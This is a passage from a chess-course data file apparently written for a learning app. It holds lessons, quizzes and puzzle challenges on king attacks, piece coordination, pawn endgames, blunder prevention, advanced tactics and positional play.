            answerIdx: 1,
            hint: 'Need superiority of force.',
            why: 'Attack when you have more pieces attacking than opponent has defending, your king is safe, and you can open lines to enemy king.'
          }
        ],
        quiz: [
          {
            q: 'What is the "Greek Gift" sacrifice?',
            choices: ['Queen sacrifice', 'Bxh7+ (or Bxh2+) to expose king', 'Trading all pieces', 'Castling kingside'],
            answerIdx: 1,
            why: 'Greek Gift is Bxh7+ (or Bxh2+ for Black), sacrificing bishop to destroy pawn shelter and expose the king to attack.'
          },
          {
            q: 'What is a "rook lift"?',
            choices: ['Promoting a pawn to rook', 'Bringing rook to 3rd rank then swinging to attack', 'Trading rooks', 'Castling'],
            answerIdx: 1,
            why: 'Rook lift: bring rook to 3rd (or 6th for Black) rank, then swing horizontally to the kingside for attack (e.g., Ra1-Ra3-Rh3).'
          },
          {
            q: 'Is it safe to advance pawns in front of your castled king?',
            choices: ['Always safe', 'Generally risky - weakens pawn shelter', 'Required for defense', 'Only in opening'],
            answerIdx: 1,
            why: 'Advancing pawns in front of castled king weakens the shelter and creates entry points for enemy pieces. Do so only with calculation!'
          }
        ],
        recall: [
            'Why should you castle early in the opening?',
            'Name three signs of an unsafe king position',
            'What is a back rank weakness?',
            'When is it okay to delay castling?'
          ],

        challenge: {
          type: 'chess',
          kind: 'puzzle',
          title: 'Attack and Defend the King',
          timeMin: 30,
          brief: 'Solve 4 attacking puzzles (including Greek Gift) and defend correctly in 2 positions where your king is under attack.',
          puzzles: [
            { theme: 'greek-gift', side: 'white' },
            { theme: 'rook-lift', side: 'white' },
            { theme: 'pawn-storm', side: 'white' },
            { theme: 'piece-sacrifice', side: 'white' },
            { theme: 'king-defense', side: 'black' },
            { theme: 'king-defense', side: 'black' }
          ],
          requirements: ['find attacking combinations', 'calculate accurately', 'defend correctly when under attack'],
          passScore: 80,
          rewardNim: 4,
          xp: 160,
          evaluator: { type: 'chess', config: { mode: 'puzzle', themes: ['king-attack', 'king-defense'], puzzleCount: 6 } }
        }
      },
      {
        slug: 'piece-coordination',
        title: 'Piece Coordination & Harmony',
        estMin: 30,
        difficulty: 2,
        lesson: {
          tldr: 'Chess pieces are strongest when working together. Coordination means pieces support each other and work toward common goals.',
          sections: [
            { h: 'What is Coordination?', body: 'Pieces coordinate when they support each other and work on the same plan. Examples: Two rooks on 7th rank. Queen and bishop on same diagonal. Knight and bishop attacking same square. Opposite: pieces on opposite sides doing nothing together = poor coordination.' },
            { h: 'Common Coordinating Patterns', body: 'Doubled rooks (same file or rank). Queen + bishop battery (same diagonal). Knight outpost supported by pawn. Two bishops controlling long diagonals. Rook behind passed pawn. These create powerful threats that are hard to defend against.' },
            { h: 'Improving Coordination', body: 'Find piece that isn\'t helping → reposition it. Identify targets → aim multiple pieces at them. Create outposts for knights (squares defended by pawn). Connect major pieces (rooks). Avoid putting pieces on same color as your bishop (blocked diagonals).' }
          ],
          example: {
            lang: 'text',
            code: 'Good Coordination:\nWhite: Rooks on d1 and d2 (doubled on d-file)\n  Queen on h5, Bishop on c1-h6 diagonal\n  All attacking Black king on g8\n  → Multiple pieces working together\n\nPoor Coordination:\nWhite: Queen on a1, Rook on h1, Bishop on b1\n  All on opposite sides, doing nothing together\n  Knight on a5 (far from action)\n  → Pieces not cooperating\n\nDoubled Rooks on 7th:\nRooks on a7 and b7\nAttacking pawns, trapping king on 8th rank\nExtremely powerful — often winning\n\nQueen + Bishop Battery:\nQueen d3, Bishop c2 (same diagonal toward h7)\nBoth attacking h7, combined force'
          },
          ask: 'Are your pieces working together or scattered?',
          keyPoints: [
            'Coordination = pieces supporting each other',
            'Doubled rooks (same file/rank) are powerful',
            'Queen + bishop on same diagonal = battery',
            'Knights need outposts (squares defended by pawns)',
            'Rooks belong behind passed pawns',
            'Bad pieces = far from action, unsupported',
            'Improve coordination: reposition inactive pieces'
          ],
          misconception: '"More pieces = better position." No! Coordinated pieces beat uncoordinated pieces even with equal material.'
        },
        practice: [
          {
            q: 'What are "doubled rooks"?',
            choices: ['Two rooks worth double points', 'Two rooks on the same file or rank', 'Rooks that moved twice', 'Promoted pawns'],
            answerIdx: 1,
            hint: 'Think about alignment.',
            why: 'Doubled rooks are two rooks aligned on the same file or rank, working together to control that line. Very powerful!'
          },
          {
            q: 'Where should a rook typically be placed relative to a passed pawn?',
            choices: ['In front of it', 'Behind it', 'Next to it', 'Opposite side of board'],
            answerIdx: 1,
            hint: 'Think about supporting the pawn\'s advance.',
            why: 'Rook behind passed pawn is best! As the pawn advances, the rook gains more space and influence. "Rooks behind passed pawns!"'
          }
        ],
        quiz: [
          {
            q: 'What is a "battery" in chess?',
            choices: ['Power source', 'Two pieces on same line (Q+B or Q+R)', 'Pawn chain', 'Castling position'],
            answerIdx: 1,
            why: 'Battery = two pieces aligned on same diagonal or file/rank, combining their power (e.g., Queen + Bishop on diagonal).'
          },
          {
            q: 'Why is a knight outpost valuable?',
            choices: ['Knights jump over pieces', 'Stable square that can\'t be attacked by pawns', 'Looks impressive', 'Required for castling'],
            answerIdx: 1,
            why: 'Outpost = square (often in enemy territory) that cannot be attacked by enemy pawns, ideal permanent home for a knight.'
          },
          {
            q: 'What typically happens when all your pieces are uncoordinated?',
            choices: ['You win faster', 'Your position is weak despite material', 'Nothing changes', 'Automatic draw'],
            answerIdx: 1,
            why: 'Uncoordinated pieces cannot support each other or create effective threats. Even with equal material, the position is weak.'
          }
        ],
        recall: [
            'What does piece coordination mean?',
            'Why is a rook on the 7th rank powerful?',
            'What makes two pieces work well together?',
            'When should pieces support each other vs act independently?'
          ],

        challenge: {
          type: 'chess',
          kind: 'analysis',
          title: 'Improve Piece Coordination',
          timeMin: 25,
          brief: 'Given 3 positions with poor coordination, identify the worst-placed piece and find the plan to improve coordination.',
          positions: [
            { theme: 'scattered-pieces', task: 'identify worst piece and improve' },
            { theme: 'no-cooperation', task: 'create piece coordination' },
            { theme: 'inactive-rooks', task: 'activate and coordinate major pieces' }
          ],
          requirements: ['identify uncoordinated pieces', 'propose improvement plan', 'demonstrate better piece placement'],
          passScore: 75,
          rewardNim: 3,
          xp: 140,
          evaluator: { type: 'chess', config: { mode: 'analysis', theme: 'coordination', requirePlan: true } }
        }
      },
      {
        slug: 'elementary-endgames',
        title: 'Elementary Endgames: Pawn Endings',
        estMin: 30,
        difficulty: 2,
        lesson: {
          tldr: 'Pawn endgames are fundamental. Master key concepts: opposition, square rule, passed pawns, and pawn races.',
          sections: [
            { h: 'Opposition', body: 'When kings face each other with one square between (e4 vs e6), the player NOT to move has "opposition" and gains advantage. Opposition helps: win by infiltrating, draw by blocking. Key defensive and offensive tool in pawn endings.' },
            { h: 'The Square Rule', body: 'Can a king catch a passed pawn? Draw a square from pawn to 8th rank (or 1st for black). If defending king can enter the square, it catches the pawn. Example: pawn on e4, square is e4-e8-h8-h4. If king reaches any square in this zone, it stops the pawn.' },
            { h: 'Pawn Races', body: 'Both sides push passed pawns, racing to promote. Count moves to promotion. Sometimes creating a new passed pawn is better than catching opponent\'s pawn. Calculate: who queens first? Does queening first give check? Can I stop their queen?' }
          ],
          example: {
            lang: 'text',
            code: 'Opposition:\nWhite King e4, Black King e6\nBlack to move → White has opposition\nBlack must give way: ...Kd6 allows Kf5 (infiltrates)\n\nSquare Rule:\nBlack: Pawn on c5, King on g8\nWhite: King on f2\nSquare: c5-c8-h8-h5\nCan Wh King reach? Kf2-e3-d4-c5 YES! → Draw\n\nPawn Race:\nWhite: King g1, Pawn a5\nBlack: King b8, Pawn h5\nCount: a5-a6-a7-a8=Q (4 moves)\n      h5-h4-h3-h2-h1=Q (5 moves)\nWhite queens first and wins!\n\nKey Squares:\nFor pawn on e6 to promote:\nKey squares: d7, e7, f7 (2 ranks ahead)\nIf king reaches these, pawn promotes\nOpponent must control these to stop pawn'
          },
          ask: 'Can you calculate who queens first in a pawn race?',
          keyPoints: [
            'Opposition: kings face off, player not moving has advantage',
            'Square rule: determines if king catches passed pawn',
            'Pawn races: count moves to promotion',
            'Key squares: squares where king guarantees pawn promotes',
            'Passed pawns must be pushed',
            'King is strong in endgame — use it actively',
            'One tempo can decide the result'
          ],
          misconception: '"Kings should stay in the corner in endgame." No! Activate your king — it\'s a strong piece in the endgame!'
        },
        practice: [
          {
            q: 'In pawn endgames, is the king strong or weak?',
            choices: ['Very weak', 'Strongest piece on board', 'Medium strength', 'Should stay in corner'],
            answerIdx: 1,
            hint: 'No queens to worry about.',
            why: 'In endgames, especially pawn endings, the king is the strongest piece! No threats of mate, so activate it aggressively.'
          },
          {
            q: 'What is the "square rule" used for?',
            choices: ['Calculating promotion square', 'Determining if king can catch a passed pawn', 'Finding the center', 'Castling rules'],
            answerIdx: 1,
            hint: 'Catching a runaway pawn.',
            why: 'Square rule tells you if the defending king can catch a passed pawn. Draw square from pawn to promotion rank — if king enters, it catches.'
          }
        ],
        quiz: [
          {
            q: 'If two kings face each other with one square between them, who has the opposition?',
            choices: ['Player to move', 'Player NOT to move', 'Both players', 'Neither player'],
            answerIdx: 1,
            why: 'The player NOT to move has opposition. This forces the opponent\'s king to give way, a key advantage in pawn endings.'
          },
          {
            q: 'In a pawn race, what is most important to calculate?',
            choices: ['Who has more pawns', 'Who queens first and if there\'s check', 'Pawn structure', 'King position only'],
            answerIdx: 1,
            why: 'In pawn races, calculate who queens first. If you queen first AND give check, you usually win. Otherwise, opponent might also queen and draw.'
          },
          {
            q: 'A pawn on the 5th rank: how many squares ahead are the "key squares"?',
            choices: ['1 rank ahead', '2 ranks ahead (6th rank)', '3 ranks ahead', 'On the 8th rank'],
            answerIdx: 1,
            why: 'Key squares are typically 2 ranks ahead of the pawn (and one square on each side). For e5 pawn: d6, e6, f6 are key squares.'
          }
        ],
        recall: [
            'What is the "rule of the square" in pawn endgames?',
            'Explain what opposition means',
            'When is king and pawn versus king a draw?',
            'What is triangulation in endgames?'
          ],

        challenge: {
          type: 'chess',
          kind: 'endgame',
          title: 'Master Pawn Endings',
          timeMin: 30,
          brief: 'Solve 4 pawn ending puzzles: use opposition to win, apply square rule, win a pawn race, and find key squares.',
          scenarios: [
            { theme: 'opposition', task: 'use opposition to infiltrate and win' },
            { theme: 'square-rule', task: 'determine if king catches pawn' },
            { theme: 'pawn-race', task: 'calculate race and promote first' },
            { theme: 'key-squares', task: 'occupy key squares to win' }
          ],
          requirements: ['demonstrate opposition', 'apply square rule', 'calculate pawn races', 'find key squares'],
          passScore: 80,
          rewardNim: 4,
          xp: 160,
          evaluator: { type: 'chess', config: { mode: 'endgame', scenarios: 4, themes: ['opposition', 'square-rule', 'pawn-race'], exactPlay: true } }
        }
      },
      {
        slug: 'blunder-prevention',
        title: 'Blunder Prevention & Error Reduction',
        estMin: 25,
        difficulty: 2,
        lesson: {
          tldr: 'Most games are decided by blunders, not brilliancies. Systematic blunder-checking before every move dramatically improves results.',
          sections: [
            { h: 'The Blunder-Check Routine', body: 'Before every move: 1) Is this piece hanging after I move? 2) Am I walking into a check/fork/pin? 3) Does opponent have a forcing response? 4) Did I check ALL of opponent\'s checks? Takes 5 seconds, prevents 90% of blunders!' },
            { h: 'Common Blunder Types', body: 'Hanging pieces (undefended after your move). Moving into pins/forks. Ignoring opponent threats. Miscalculating trades. Moving without checking opponent\'s checks. Rushing in time pressure. Most blunders are preventable with simple checks!' },
            { h: 'Blunder Recovery', body: 'Blundered? Don\'t panic or resign immediately! Look for counterplay: Can I give checks? Create threats? Complicate? Set traps? Sometimes opponent doesn\'t see your blunder. Even if they do, fight for practical chances. Resign only when truly hopeless.' }
          ],
          example: {
            lang: 'text',
            code: 'Blunder Check (BEFORE moving):\n✓ "If I play Nf6, is the knight defended?"\n✓ "Can opponent fork my king and queen?"\n✓ "What are ALL of opponent\'s checks?"\n✓ "Am I walking into a pin?"\n✓ "Did I miss a defensive move?"\n\n❌ Common Blunders:\nHanging piece: Moves bishop, leaves queen undefended\nMissed check: Didn\'t see Qa4+, loses piece\nWrong trade: Thought Nxe5 wins pawn, missed Bxe5\nPin blindness: Moved pinned piece, exposed king\n\n✓ After Blundering:\nDon\'t panic! Look for:\n- Checks (create threats)\n- Counter-threats\n- Complications\n- Traps (opponent might blunder back)\nFight until position is truly hopeless'
          },
          ask: 'Do you check for hanging pieces before every move?',
          keyPoints: [
            'Blunder-check routine: hanging pieces? checks? forks/pins?',
            'Most games won by avoiding blunders, not finding brilliancies',
            'Hanging pieces are #1 blunder type',
            'Check ALL opponent checks before moving',
            'Take time on critical moves',
            'After blunder: don\'t panic, look for counterplay',
            'Even strong players blunder — reducing blunders wins games'
          ],
          misconception: '"Only beginners blunder." Everyone blunders! Even GMs. The difference: they blunder less often and in more complex positions.'
        },
        practice: [
          {
            q: 'What is the #1 most common blunder type?',
            choices: ['Bad openings', 'Hanging pieces (undefended pieces)', 'Slow development', 'Wrong endgame technique'],
            answerIdx: 1,
            hint: 'Material left en prise.',
            why: 'Hanging pieces (leaving pieces undefended and attackable) is the most common blunder at all levels. Always check if pieces are defended!'
          },
          {
            q: 'What should you do immediately after realizing you blundered?',
            choices: ['Resign instantly', 'Look for counterplay and complications', 'Apologize', 'Move faster'],
            answerIdx: 1,
            hint: 'Keep fighting.',
            why: 'After blundering, look for checks, threats, and complications. Opponent might not see it, or you might get counterplay. Don\'t resign too early!'
          }
        ],
        quiz: [
          {
            q: 'How long should a blunder-check take?',
            choices: ['10 minutes', '5-10 seconds', '1 second', 'Not necessary'],
            answerIdx: 1,
            why: 'A quick blunder-check (5-10 seconds) asks: hanging pieces? checks? forks/pins? This prevents 90% of blunders without taking much time.'
          },
          {
            q: 'What should you always check before moving?',
            choices: ['Time on clock only', 'All of opponent\'s possible checks', 'Your rating', 'Opening database'],
            answerIdx: 1,
            why: 'Always check ALL opponent checks before moving! Missing a check is a common cause of blunders. Ask: "What checks can opponent give?"'
          },
          {
            q: 'Why do strong players blunder less?',
            choices: ['They never make mistakes', 'They use systematic checking routines', 'They memorize everything', 'Luck'],
            answerIdx: 1,
            why: 'Strong players use systematic blunder-checking routines before every move. They still blunder, but much less often than players who move impulsively.'
          }
        ],
        recall: [
            'What is the definition of a blunder?',
            'Name two blunder prevention techniques',
            'What question should you ask yourself before every move?',
            'Why is time pressure a common cause of blunders?'
          ],

        challenge: {
          type: 'chess',
          kind: 'puzzle',
          title: 'Avoid the Blunder',
          timeMin: 20,
          brief: 'In 6 positions, identify the tempting but losing move (blunder), explain why it loses, and find the correct move.',
          scenarios: [
            { theme: 'hanging-piece', task: 'avoid leaving piece hanging' },
            { theme: 'missed-check', task: 'see the devastating check' },
            { theme: 'wrong-trade', task: 'calculate trade correctly' },
            { theme: 'pin-blindness', task: 'recognize pin before moving' },
            { theme: 'fork-trap', task: 'avoid walking into fork' },
            { theme: 'defensive-resource', task: 'find defensive move' }
          ],
          requirements: ['identify blunder in each position', 'explain why it loses', 'find correct move', 'demonstrate checking routine'],
          passScore: 85,
          rewardNim: 3,
          xp: 130,
          evaluator: { type: 'chess', config: { mode: 'puzzle', theme: 'blunder-prevention', puzzleCount: 6, requireExplanation: true } }
        }
      },
      /* ══════ LEVEL 3: INTERMEDIATE ══════ */
      {
        slug: 'advanced-tactics',
        title: 'Advanced Tactical Patterns',
        estMin: 35,
        difficulty: 3,
        lesson: {
          tldr: 'Master complex tactical themes: removal of defender, interference, X-ray, windmill, and zwischenzug (in-between move).',
          sections: [
            { h: 'Removal of Defender', body: 'Eliminate or deflect the piece defending a key square or piece. Often involves sacrifice. Example: Rxd7! forces Qxd7 (queen deflected from defending f7), then Qxf7# is checkmate.' },
            { h: 'Interference & X-Ray', body: 'Interference: block opponent\'s piece from defending. X-ray: attack through one piece to reach piece behind it. Example X-ray: Rook on a1 X-rays through queen on a4 to attack rook on a8.' },
            { h: 'Windmill & Zwischenzug', body: 'Windmill: series of discovered checks winning material repeatedly. Zwischenzug: in-between move, not recapturing immediately. Example: expected Nxd4 but play Qb6+! first (check), THEN recapture after opponent responds.' }
          ],
          example: {
            lang: 'text',
            code: 'Removal of Defender:\n1. Bxe6! (removes knight defending f7)\n1...fxe6 2. Qxe6+ wins\n\nWindmill:\n1. Rxg7+ Kh8 (or Kf8)\n2. Rxf7+ Kg8 (discovered check)\n3. Rg7+ Kh8 4. Rxb7+ etc.\nRook eats pawns with discovered checks\n\nZwischenzug:\nExpected: 1...Nxe5\nActual: 1...Qb4+! (check first!)\n2. Kf1 Nxe5 (now recapture)\nWon tempo with intermediate check'
          },
          ask: 'Have you spotted zwischenzug opportunities?',
          keyPoints: [
            'Removal of defender: eliminate the guard',
            'Interference: block defensive pieces',
            'X-ray: attack through one piece to another',
            'Windmill: repeated discovered checks',
            'Zwischenzug: intermediate forcing move',
            'Always look for in-between moves before recapturing',
            'Complex tactics combine multiple themes'
          ],
          misconception: '"Must recapture immediately." No! Check for zwischenzug (in-between moves) first — checks, captures, threats.'
        },
        practice: [
          {
            q: 'What is a zwischenzug?',
            choices: ['German opening', 'In-between forcing move before expected recapture', 'Type of endgame', 'Pawn structure'],
            answerIdx: 1,
            hint: 'Intermediate move.',
            why: 'Zwischenzug (German for "in-between move") is a forcing move played before the expected recapture or response, often winning material or improving position.'
          },
          {
            q: 'What characterizes a windmill combination?',
            choices: ['Rotating pieces', 'Series of discovered checks winning material', 'Pawn march', 'Castling queenside'],
            answerIdx: 1,
            hint: 'Repetitive discovered checks.',
            why: 'Windmill is a series of discovered checks where the moving piece attacks one target while the revealed piece gives check, repeatedly winning material.'
          }
        ],
        quiz: [
          {
            q: 'How does removal of defender differ from deflection?',
            choices: ['Same thing', 'Removal captures/eliminates, deflection forces away', 'Deflection is stronger', 'No real difference'],
            answerIdx: 1,
            why: 'Removal of defender eliminates (captures) the defending piece. Deflection forces it away from its defensive post. Similar goals, different methods.'
          },
          {
            q: 'What is an X-ray attack?',
            choices: ['See-through pieces', 'Attacking through one piece to reach piece behind', 'Laser attack', 'Always wins'],
            answerIdx: 1,
            why: 'X-ray attack goes "through" one piece to attack a piece behind it. Example: Rook attacks queen, if queen moves, rook captures rook behind it.'
          },
          {
            q: 'When should you look for zwischenzug?',
            choices: ['Never', 'Before every expected recapture or response', 'Only in endgames', 'Only with queens'],
            answerIdx: 1,
            why: 'Always check for zwischenzug before the "obvious" recapture. Ask: "Is there a forcing move (check, threat) I should play first?"'
          }
        ],
        recall: [
            'What is a discovered attack?',
            'Explain deflection in chess tactics',
            'What is a zwischenzug (in-between move)?',
            'Describe the "removing the defender" tactic'
          ],

        challenge: {
          type: 'chess',
          kind: 'puzzle',
          title: 'Advanced Tactical Mastery',
          timeMin: 35,
          brief: 'Solve 7 complex puzzles featuring removal of defender, interference, X-ray, windmill, zwischenzug, and combined themes.',
          puzzles: 7,
          themes: ['removal-defender', 'interference', 'x-ray', 'windmill', 'zwischenzug', 'combined', 'combined'],
          requirements: ['identify tactical theme', 'calculate complete combination', 'find all forcing moves'],
          passScore: 75,
          rewardNim: 5,
          xp: 180,
          evaluator: { type: 'chess', config: { mode: 'puzzle', difficulty: 'advanced', puzzleCount: 7, requireFullSolution: true } }
        }
      },
      {
        slug: 'middlegame-strategy',
        title: 'Middlegame Strategy & Planning',
        estMin: 35,
        difficulty: 3,
        lesson: {
          tldr: 'The middlegame requires strategic planning. Learn to formulate plans based on pawn structure, piece activity, and weaknesses.',
          sections: [
            { h: 'Strategic Planning', body: 'Plans come from position features: pawn structure, piece placement, king safety, space advantage. Ask: What are the long-term weaknesses? Which pieces need improving? What is my opponent\'s plan? Typical plans: minority attack, pawn breaks, piece exchanges, king attack.' },
            { h: 'Imbalances', body: 'Imbalances drive plans. Types: material, pawn structure, space, piece activity, king safety, development. Play to your imbalance advantages. Example: if you have bishop pair, avoid trades and open position. If opponent has weak squares, occupy them.' },
            { h: 'Prophylaxis', body: 'Prevent opponent\'s plans before executing yours. Ask: "What is opponent threatening/planning?" Stop it first! Example: opponent wants ...e5 break, you play d5 to prevent it. Prophylactic thinking improves positions without immediate tactics.' }
          ],
          example: {
            lang: 'text',
            code: 'Strategic Analysis:\nPawn Structure: IQP (isolated queen pawn)\n→ Plan: Active piece play, tactics\n   Avoid endgames (weak pawn)\n\nImbalance: Bishop pair vs Knight pair\n→ Plan: Open position, avoid trades\n   Use long-range bishop advantage\n\nProphylaxis Example:\nOpponent plans: ...e5 (pawn break)\nYou play: d5! (prevents ...e5)\nThen: Improve pieces, opponent stuck\n\nMinority Attack:\nWhite: a and b pawns\nBlack: a, b, c pawns\nWhite advances b4-b5 creating weakness\nClassic queenside strategy'
          },
          ask: 'Can you identify your plan in current games?',
          keyPoints: [
            'Plans come from position features',
            'Identify imbalances (material, structure, space, activity)',
            'Play to your advantages',
            'Prophylaxis: prevent opponent plans',
            'Improve worst-placed piece',
            'Minority attack, pawn breaks, piece play',
            'Strategy + tactics = complete chess'
          ],
          misconception: '"Just calculate tactics." Tactics without strategy is aimless. Strategy guides which tactics to look for.'
        },
        practice: [
          {
            q: 'What is prophylaxis in chess?',
            choices: ['Opening system', 'Preventing opponent\'s plans', 'Endgame technique', 'Tactical motif'],
            answerIdx: 1,
            hint: 'Preventive thinking.',
            why: 'Prophylaxis means preventing opponent\'s plans before they execute them. Ask "What does opponent want?" then stop it!'
          },
          {
            q: 'Where do plans come from?',
            choices: ['Random ideas', 'Position features: structure, weaknesses, imbalances', 'Opening theory only', 'Computer evaluation'],
            answerIdx: 1,
            hint: 'Based on the position.',
            why: 'Plans come from concrete position features: pawn structure, piece placement, weaknesses, space, king safety. Assess position, then formulate plan.'
          }
        ],
        quiz: [
          {
            q: 'If you have the bishop pair, what should you generally do?',
            choices: ['Trade bishops immediately', 'Keep bishops and open position', 'Castle queenside', 'Play for stalemate'],
            answerIdx: 1,
            why: 'Bishop pair is strongest in open positions. Keep bishops (avoid trades), open lines, use their long-range power.'
          },
          {
            q: 'What is a "minority attack"?',
            choices: ['Attack with fewer pieces', 'Advance pawns on side where you have fewer pawns', 'Beginner strategy', 'Illegal move'],
            answerIdx: 1,
            why: 'Minority attack: advance pawns on the side where you have fewer pawns (e.g., your 2 pawns vs opponent\'s 3), creating weaknesses.'
          },
          {
            q: 'In positions with isolated queen pawn (IQP), what is White\'s typical plan?',
            choices: ['Trade into endgame', 'Active piece play and tactics', 'Defend passively', 'Castle queenside'],
            answerIdx: 1,
            why: 'With IQP, play actively! Use piece activity and tactical chances. Avoid trading into endgames where the isolated pawn becomes weak.'
          }
        ],
        recall: [
            'What are the three main elements of chess strategy?',
            'When should you consider trading pieces?',
            'What makes a square "good" for a knight?',
            'What is the principle of two weaknesses?'
          ],

        challenge: {
          type: 'chess',
          kind: 'analysis',
          title: 'Strategic Planning Exercise',
          timeMin: 35,
          brief: 'Analyze 3 complex middlegame positions: identify imbalances, formulate plans, find prophylactic moves, and explain strategic ideas.',
          positions: [
            { theme: 'bishop-pair', tasks: ['identify imbalance', 'formulate plan', 'find best moves'] },
            { theme: 'IQP', tasks: ['assess structure', 'plan for both sides', 'find key moves'] },
            { theme: 'space-advantage', tasks: ['evaluate position', 'prophylactic ideas', 'concrete plan'] }
          ],
          requirements: ['identify key features', 'formulate concrete plans', 'find candidate moves', 'explain strategic reasoning'],
          passScore: 75,
          rewardNim: 5,
          xp: 180,
          evaluator: { type: 'chess', config: { mode: 'analysis', complexity: 'strategic', requireExplanation: true, positions: 3 } }
        }
      },
      {
        slug: 'attack-and-defense',
        title: 'Attack & Defense Balance',
        estMin: 30,
        difficulty: 3,
        lesson: {
          tldr: 'Successful attacks require proper balance. Learn when to attack, when to defend, and how to balance offense and defense.',
          sections: [
            { h: 'Calculating the Attack', body: 'Count attackers vs defenders. Need more attackers than defenders (or equal with tactical blow). Bring pieces quickly to the attack. Don\'t start attacking with few pieces. If opponent has equal defenders, attacking fails.' },
            { h: 'Defensive Techniques', body: 'Defend by: 1) Adding defenders, 2) Eliminating attackers, 3) Creating counter-threats, 4) Blocking attack lines, 5) Moving king to safety. Counter-attack often better than passive defense. "The best defense is a good offense."' },
            { h: 'Dynamic Balance', body: 'Sometimes positions are dynamic: both sides attacking different targets. Calculate: whose attack arrives first? Can I ignore their attack? Must I defend or can I counter-attack? Time and tempo are critical. Mutual attacks make chess exciting!' }
          ],
          example: {
            lang: 'text',
            code: 'Attack Calculation:\nWhite attacking black king:\n4 attackers (Q, R, B, N) vs 3 defenders\n→ Attack likely succeeds\n\nDefensive Resources:\n1. Add defender: Rf8-e8 (defends e7)\n2. Eliminate attacker: Trade queen for queen\n3. Counter-attack: Create threat on white king\n4. Block: ...Nf6 blocks attack\n5. King moves: Kg8-h8 escapes\n\nDynamic Position:\nWhite: attacking kingside (3 moves to mate)\nBlack: attacking queenside (4 moves to mate)\nWhite moves first → White\'s attack wins!\nTempo decides the game'
          },
          ask: 'Do you count attackers vs defenders before attacking?',
          keyPoints: [
            'Count attackers vs defenders',
            'Need superiority to attack successfully',
            'Defense: add defenders, eliminate attackers, counter-attack',
            'Counter-attack often better than passive defense',
            'Dynamic positions: whose attack arrives first?',
            'Tempo is critical in mutual attacks',
            'Don\'t defend everything — prioritize'
          ],
          misconception: '"Always defend when attacked." Sometimes counter-attacking is stronger! Calculate if you have time for counter-threats.'
        },
        practice: [
          {
            q: 'What is the minimum requirement to launch a successful attack?',
            choices: ['Have a queen', 'More attackers than defenders (or equal with tactics)', 'Castle first', 'Win material first'],
            answerIdx: 1,
            hint: 'Numerical superiority.',
            why: 'Need more attacking pieces than defending pieces, OR equal numbers with a tactical blow. Insufficient attackers = failed attack.'
          },
          {
            q: 'When is counter-attack better than defense?',
            choices: ['Never', 'When your counter-threat is faster/stronger', 'Always', 'Only in endgames'],
            answerIdx: 1,
            hint: 'Racing attacks.',
            why: 'Counter-attack is best when your threat arrives faster or is stronger than opponent\'s attack. Calculate: whose attack wins the race?'
          }
        ],
        quiz: [
          {
            q: 'In a dynamic position with mutual attacks, what is most important?',
            choices: ['Material count', 'Whose attack arrives first (tempo)', 'Pawn structure', 'Opening choice'],
            answerIdx: 1,
            why: 'In mutual attacks, tempo (whose attack arrives first) is critical. Count moves to checkmate/winning material for both sides.'
          },
          {
            q: 'What does "the best defense is a good offense" mean?',
            choices: ['Never defend', 'Counter-attacking can be more effective than passive defense', 'Attack randomly', 'Ignore opponent'],
            answerIdx: 1,
            why: 'Creating counter-threats forces opponent to defend instead of attack, often more effective than passively defending.'
          },
          {
            q: 'How do you evaluate if an attack will succeed?',
            choices: ['Hope for the best', 'Count attackers vs defenders, calculate forcing moves', 'Check computer', 'Flip a coin'],
            answerIdx: 1,
            why: 'Evaluate attacks by counting attackers vs defenders and calculating concrete forcing moves (checks, captures, threats).'
          }
        ],
        recall: [
            'Name three principles of successful attacks',
            'What is prophylaxis in chess?',
            'When should you counterattack instead of defending?',
            'What is meant by "attack on two wings"?'
          ],

        challenge: {
          type: 'chess',
          kind: 'puzzle',
          title: 'Attack & Defense Mastery',
          timeMin: 30,
          brief: 'Solve 6 positions: 3 where you must attack correctly (calculate attackers vs defenders), 3 where you must defend or counter-attack.',
          scenarios: [
            { theme: 'calculate-attack', side: 'white', task: 'evaluate and execute attack' },
            { theme: 'king-attack', side: 'white', task: 'decisive king attack' },
            { theme: 'mutual-attacks', side: 'white', task: 'win the race' },
            { theme: 'active-defense', side: 'black', task: 'defend actively' },
            { theme: 'counter-attack', side: 'black', task: 'counter-attack instead of defending' },
            { theme: 'defensive-resources', side: 'black', task: 'find defensive resource' }
          ],
          requirements: ['calculate attacks correctly', 'find defensive resources', 'recognize counter-attack opportunities'],
          passScore: 80,
          rewardNim: 5,
          xp: 170,
          evaluator: { type: 'chess', config: { mode: 'puzzle', themes: ['attack', 'defense', 'counterattack'], puzzleCount: 6 } }
        }
      },
      {
        slug: 'positional-play',
        title: 'Positional Play & Long-term Advantages',
        estMin: 35,
        difficulty: 3,
        lesson: {
          tldr: 'Positional chess focuses on small, long-term advantages: better pieces, space, pawn structure. Accumulate small advantages until they become decisive.',
          sections: [
            { h: 'Positional Elements', body: 'Space: control more squares. Bad pieces: pieces with limited scope (blocked by pawns). Weak squares: squares opponent cannot control with pawns. Pawn weaknesses: isolated, doubled, backward. Strong outposts: squares for pieces opponent cannot challenge. Each element gives slight advantage.' },
            { h: 'Improving Pieces', body: 'Identify worst-placed piece → relocate it. "A knight on the rim is dim" — centralize pieces. Bishops need open diagonals. Rooks on open files or 7th rank. Queens coordinate with other pieces. Systematically improve piece placement.' },
            { h: 'Accumulating Advantages', body: 'One small advantage may not win. Accumulate multiple advantages: better pieces + space + structure = winning position. Like drops filling a bucket. Don\'t rush — positional advantages mature slowly. Eventually, tactical blow finishes the game.' }
          ],
          example: {
            lang: 'text',
            code: 'Space Advantage:\nWhite controls: e4, d4, c4\nBlack: cramped, pieces lack scope\n→ White can maneuver, Black is passive\n\nBad Bishop:\nBishop on c1, pawns on c3, d4, e3 (same color)\n→ Bishop blocked by own pawns\nImprove: Trade it or reposition pawns\n\nWeak Square Complex:\nBlack has weak d5, f5 squares (no pawns control)\nWhite places: Knight on d5, pressure on e6\n→ Dominating position\n\nAccumulation:\nMove 1: Improve bishop (small +)\nMove 5: Occupy outpost (small +)\nMove 10: Rook on 7th rank (small +)\nMove 15: Combination wins (accumulation paid off!)'
          },
          ask: 'Which of your pieces needs improvement in your games?',
          keyPoints: [
            'Positional elements: space, piece activity, structure, weak squares',
            'Bad pieces: blocked by own pawns, passive placement',
            'Identify worst piece and improve it',
            'Weak squares: opponent cannot control with pawns',
            'Accumulate small advantages patiently',
            'Positional advantage → eventual tactic',
            'Space advantage limits opponent options'
          ],
          misconception: '"Positional play is boring." No! Building pressure then delivering tactical blow is deeply satisfying.'
        },
        practice: [
          {
            q: 'What is a "bad bishop"?',
            choices: ['Bishop that hangs', 'Bishop blocked by own pawns on same color', 'Any bishop', 'Unpromoted pawn'],
            answerIdx: 1,
